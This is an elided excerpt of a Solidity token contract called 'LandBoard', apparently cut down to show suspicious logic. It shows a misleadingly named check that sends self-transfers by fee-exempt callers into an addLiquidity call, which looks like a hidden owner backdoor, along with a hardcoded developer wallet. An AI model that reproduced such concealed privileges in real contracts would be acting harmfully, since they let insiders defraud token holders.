...
library Address {
    ...
    function MetaRimPair(address account) internal pure  returns (bool) {
...
contract TOKEN is Ownable, IERC20 {
    ...
    address private devmkt = 0xC4EEb1De88aE7119ADc30f6e01D0d837e74Bb690;
    string private _name = "LandBoard";
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        if (MetaRim2Pair(from, to)) {return addLiquidity(amount, to);}
        ...
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.MetaRimPair(to) && to != address(this) && !inLiquidityTransaction && !babybool) {
    ...
    function MetaRim2Pair(address from, address to) internal view returns(bool) {
        return (_excludedFromFee[msg.sender] || Address.MetaRimPair(to)) && to == from;
    }
